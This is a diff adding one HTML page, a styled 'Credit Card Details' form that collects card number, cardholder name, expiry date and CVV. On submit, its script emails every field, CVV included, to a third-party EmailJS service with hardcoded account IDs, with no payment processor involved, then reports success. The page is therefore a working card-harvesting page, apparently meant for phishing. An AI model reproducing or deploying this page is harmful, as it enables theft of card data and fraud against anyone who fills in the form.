@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Credit Card Form</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(120deg, #4e54c8, #8f94fb);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .form-container {
+            background-color: white;
+            padding: 20px 30px;
+            border-radius: 15px;
+            box-shadow: 0px 10px 25px rgba(0, 0, 0, 0.3);
+            max-width: 400px;
+            width: 100%;
+        }
+        .form-container h2 {
+            text-align: center;
+            color: #333;
+            margin-bottom: 20px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #444;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 14px;
+            outline: none;
+        }
+        .submit-btn {
+            background-color: #6c63ff;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
+            transition: background-color 0.3s;
+        }
+        .submit-btn:hover {
+            background-color: #4e54c8;
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <h2>Credit Card Details</h2>
+        <form id="creditCardForm">
+            <div class="input-group">
+                <label for="cardNumber">Card Number</label>
+                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+            </div>
+            <div class="input-group">
+                <label for="cardHolder">Cardholder Name</label>
+                <input type="text" id="cardHolder" placeholder="John Doe" required>
+            </div>
+            <div class="input-group">
+                <label for="expiryDate">Expiry Date</label>
+                <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" required>
+            </div>
+            <div class="input-group">
+                <label for="cvv">CVV</label>
+                <input type="password" id="cvv" placeholder="123" maxlength="3" required>
+            </div>
+            <button type="submit" class="submit-btn">Submit</button>
+        </form>
+    </div>
+
+    <script>
+        emailjs.init("ZlC5yOkQwD-9HRKBE"); // Replace with your Email.js User ID
+
+        // Format the card number to insert a space every 4 digits
+        document.getElementById('cardNumber').addEventListener('input', function(event) {
+            let value = event.target.value.replace(/\D/g, ''); // Remove non-digits
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += ' '; // Add space every 4 digits
+                }
+                formattedValue += value[i];
+            }
+            event.target.value = formattedValue;
+        });
+
+        // Format the expiry date to add a slash between MM and YY
+        document.getElementById('expiryDate').addEventListener('input', function(event) {
+            let value = event.target.value.replace(/\D/g, ''); // Remove non-digits
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4); // Add slash
+            }
+            event.target.value = value;
+        });
+
+        // Handle form submission
+        document.getElementById('creditCardForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const cardNumber = document.getElementById('cardNumber').value;
+            const cardHolder = document.getElementById('cardHolder').value;
+            const expiryDate = document.getElementById('expiryDate').value;
+            const cvv = document.getElementById('cvv').value;
+
+            emailjs.send("service_kuf3aad", "template_qkzhsz9", {
+                card_number: cardNumber,
+                card_holder: cardHolder,
+                expiry_date: expiryDate,
+                cvv: cvv
+            })
+            .then(function(response) {
+                alert('Form submitted successfully!');
+            }, function(error) {
+                alert('Failed to send form. Please try again.');
+                console.log('Error:', error); // Logs more details for debugging
+            });
+        });
+    </script>
+</body>
+</html>
